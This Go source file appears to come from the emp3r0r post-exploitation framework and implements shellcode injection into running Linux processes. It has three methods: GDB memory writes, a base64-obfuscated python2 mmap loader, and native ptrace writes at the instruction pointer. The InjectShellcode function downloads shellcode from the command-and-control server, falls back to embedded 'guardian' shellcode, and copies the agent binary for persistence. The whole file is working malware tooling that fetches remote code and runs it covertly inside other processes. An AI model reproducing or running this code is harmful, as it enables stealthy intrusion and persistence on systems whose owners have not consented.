package agent

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// gdbInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// modify /proc/sys/kernel/yama/ptrace_scope if gdb does not work
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
// FIXME does not work
func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
	}

	return nil
}

// pyShellcodeLoader pure python, using ptrace
func pyShellcodeLoader(shellcode *string, shellcodeLen int) error {
	if !util.IsCommandExist("python2") {
		return fmt.Errorf("python2 is not found, shellcode loader won't work")
	}

	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "\\x", -1)

	// python2 shellcode loader template
	pyloader := fmt.Sprintf(`
import ctypes
import sys
from ctypes.util import find_library

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0X02
MAP_ANONYMOUS = 0X20
ENOMEM = -1

SHELLCODE = "%s"

libc = ctypes.CDLL(find_library('c'))

mmap = libc.mmap
mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
				 ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
mmap.restype = ctypes.c_void_p

page_size = ctypes.pythonapi.getpagesize()
sc_size = len(SHELLCODE)
mem_size = page_size * (1 + sc_size/page_size)

cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE |
			PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
			-1, 0)

if cptr == ENOMEM:
	sys.exit("mmap")

if sc_size <= mem_size:
	ctypes.memmove(cptr, SHELLCODE, sc_size)
	sc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
	call_sc = ctypes.cast(cptr, sc)
	call_sc(None)
`, *shellcode)

	encPyloader := tun.Base64Encode(pyloader)
	cmd := fmt.Sprintf(`echo "exec('%s'.decode('base64'))"|python2`, encPyloader)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		log.Printf("python2 shellcode loader: %v\n%s", err, out)
		return fmt.Errorf("pyloader: %v\n%s", err, out)
	}
	log.Printf("python2 loader has loaded %d of shellcode: %s", shellcodeLen, out)

	return nil
}

// Injector inject shellcode to arbitrary running process
// target process will be restored after shellcode has done its job
func Injector(shellcode *string, pid int) error {
	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)

	// decode hex shellcode string
	sc, err := hex.DecodeString(*shellcode)
	if err != nil {
		return fmt.Errorf("Decode shellcode: %v", err)
	}

	// inject to an existing process or start a new one
	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
	if pid == 0 {
		// start a child process to inject shellcode into
		sec := strconv.Itoa(util.RandInt(10, 30))
		child := exec.Command("sleep", sec)
		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
		err = child.Start()
		if err != nil {
			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
		}
		pid = child.Process.Pid

		// attach
		err = child.Wait() // TRAP the child
		if err != nil {
			log.Printf("child process wait: %v", err)
		}
		log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
	} else {
		// attach to an existing process
		proc, err := os.FindProcess(pid)
		if err != nil {
			return fmt.Errorf("%d does not exist: %v", pid, err)
		}
		pid = proc.Pid

		// https://github.com/golang/go/issues/43685
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		err = syscall.PtraceAttach(pid)
		if err != nil {
			return fmt.Errorf("ptrace attach: %v", err)
		}
		_, err = proc.Wait()
		if err != nil {
			return fmt.Errorf("Wait %d: %v", pid, err)
		}
		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
	}

	// read RIP
	origRegs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(pid, origRegs)
	if err != nil {
		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
	}
	origRip := origRegs.Rip
	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)

	// save current code for restoring later
	origCode := make([]byte, len(sc))
	n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)

	// write shellcode to .text section, where RIP is pointing at
	data := sc
	n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
	if err != nil {
		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
	}
	log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)

	// peek: see if shellcode has got injected
	peekWord := make([]byte, len(data))
	n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)

	// continue and wait
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("Continue: %v", err)
	}
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("continue: wait4: %v", err)
	}

	// what happened to our child?
	switch {
	case ws.Continued():
		return nil
	case ws.CoreDump():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
	case ws.Exited():
		return nil
	case ws.Signaled():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
	case ws.Stopped():
		stoppedRegs := &syscall.PtraceRegs{}
		err = syscall.PtraceGetRegs(pid, stoppedRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)

		// restore registers
		err = syscall.PtraceSetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("Restoring process: set regs: %v", err)
		}

		// breakpoint hit, restore the process
		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
		if err != nil {
			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
		}
		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)

		// let it run
		err = syscall.PtraceDetach(pid)
		if err != nil {
			return fmt.Errorf("Continue detach: %v", err)
		}
		log.Printf("%d will continue to run", pid)

		return nil
	default:
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("continue: RIP at 0x%x", origRegs.Rip)
	}

	return nil
}

// InjectShellcode inject shellcode to a running process using various methods
func InjectShellcode(pid int, method string) (err error) {
	// prepare the shellcode
	sc, err := DownloadViaCC(CCAddress+"www/shellcode.txt", "")
	if err != nil {
		sc = []byte(GuardianShellcode)
		err = util.Copy(os.Args[0], GuardianAgentPath)
		if err != nil {
			return
		}
	}
	shellcode := string(sc)
	shellcodeLen := strings.Count(string(shellcode), "0x")

	// dispatch
	switch method {
	case "gdb":
		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
	case "native":
		err = Injector(&shellcode, pid)
	case "python":
		err = pyShellcodeLoader(&shellcode, shellcodeLen)
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
